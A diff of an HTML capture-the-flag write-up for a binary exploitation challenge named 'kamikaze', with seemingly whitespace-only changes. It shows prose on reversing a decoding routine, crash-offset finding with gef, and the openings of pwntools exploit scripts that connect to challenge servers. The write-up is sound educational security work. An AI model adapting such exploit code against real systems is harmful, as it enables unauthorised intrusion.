@@ -825,7 +825,7 @@ The binary is unstripped, so we can easily see the main function. The disassembl
 )
 </code></pre><p>i.e. the pointer to the numbers, the 3rd element of a precomputed array, the pointer to that array (basically the first element) and the second parameter again.</p>
 <p>This function is very interesting, it takes a number does some computation on it and returns a nuber which is the ASCII representaion of the decoded character. For this function, I wrote a separate C++ program to emulate the functionality and to get the mappings to generate all ASCII characters.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;bits/stdc++.h&gt;</span><span style="color:#75715e">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;bits/stdc++.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span>
 <span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;
 
@@ -912,7 +912,7 @@ The binary is unstripped, so we can easily see the main function. The disassembl
 <p>The offset of the crash is calculated using gef&rsquo;s pattern create and pattern search functionality.</p>
 <p>My exploit code -</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
+<span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
 p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./kamikaze&#34;</span>)
 e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./kamikaze&#39;</span>)
 p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;13.48.67.196&#34;</span>, <span style="color:#ae81ff">50000</span>)
@@ -964,7 +964,7 @@ p<span style="color:#f92672">.</span>interactive()
 <p>After this, it becomes just a matter of calculating offsets. We place the return address on the stack in two parts, and the offsets are calculated accordingly. I could go in depth regarding the offsets, but it is a pretty simple (not easy) process. If you have doubts, leave a comment, I will explain it.</p>
 <p>The final exploit code is -</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
+<span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
 p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./kamikaze2&#34;</span>)
 p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;13.53.125.206&#34;</span>, <span style="color:#ae81ff">50000</span>)
 
